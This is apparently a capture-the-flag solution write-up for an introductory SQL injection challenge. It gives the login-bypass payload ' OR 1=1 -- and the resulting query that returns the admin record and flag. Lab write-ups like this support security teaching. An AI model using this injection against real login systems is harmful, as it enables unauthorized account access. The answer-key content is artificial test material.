# SQL Injection 101

## Solution
Enter `' OR 1=1 --` as the username with any password. The SQL query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
```
This returns the first user (admin) whose profile contains the flag: `CTF{REDACTED}`
